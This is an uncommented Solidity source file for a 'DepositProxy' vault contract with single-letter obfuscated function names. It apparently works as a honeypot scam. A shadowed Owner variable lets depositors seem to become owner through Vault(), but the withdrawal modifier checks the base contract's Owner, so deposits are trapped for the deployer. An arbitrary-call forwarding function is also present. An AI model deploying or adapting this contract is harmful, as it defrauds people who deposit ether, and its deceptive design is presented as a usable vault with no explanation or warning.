pragma solidity ^0.4.24;

contract Proxy  {
    modifier b { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function a(address g) public b { Owner = g; }
    function h(address f, bytes data) public payable {
        f.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            d();
        }
    }

    function d() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function c(uint256 e) public b {
        if (e>0 && Deposits[msg.sender]>=e) {
            msg.sender.transfer(e);
        }
    }
}